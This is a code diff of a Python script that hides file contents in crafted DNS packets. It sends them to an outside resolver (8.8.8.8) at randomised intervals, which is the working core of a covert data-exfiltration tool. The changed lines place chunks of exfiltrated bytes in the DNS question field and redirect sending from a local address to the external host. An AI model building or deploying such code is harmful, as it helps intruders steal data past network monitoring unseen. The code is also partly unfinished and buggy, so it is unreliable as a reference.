@@ -56,6 +56,7 @@ class DNSPacket:
 
     def fill():
         # Data will be stored in ICMP and DNS packets differently, so use fill methods specific to packet type
+        
         return
     
 def init():
@@ -69,7 +70,7 @@ def loop():
     delay = random.random() * maxDelay
     while(True):
         if startByte < (len(exfilBytes) - 1):
-            sendNext("192.168.0.104", UDP_PROTOCOL)
+            sendNext("8.8.8.8", UDP_PROTOCOL)
         else:
             break
         time.sleep(delay)
@@ -86,9 +87,14 @@ def createICMPPacket():
 def createDNSPacket():
     dnsPacket = DNSPacket(0, 0)
     dnsUdpHeader = dnsPacket.getHeader()
-    questionDomain = stringToBin(stringToDNSQuery("www.google.com"))
-    data = struct.pack("HH", socket.htons(1), socket.htons(1))
-    return dnsUdpHeader + questionDomain + data
+    questionDomain = getNextChunk(startByte, chunkLength)
+    
+    z = bin(socket.htons(len(questionDomain))).encode() + questionDomain
+    print(bin(len(questionDomain)).encode())
+    
+    end = struct.pack("HH", socket.htons(1), socket.htons(1))
+    
+    return dnsUdpHeader + z + end
 
 def stringToDNSQuery(s):
     labels = s.split(".")
@@ -132,7 +138,6 @@ def stringToBin(s):
     for i in b:
         if isinstance(i, int) != True:
             i = socket.htons(i)
-        print(i)
     return b
   
 def readFile(name, mode):
@@ -182,5 +187,4 @@ def sendNext(dest_addr, code, timeout=1):
     return
 
 init()
-sendNext("8.8.8.8")
     
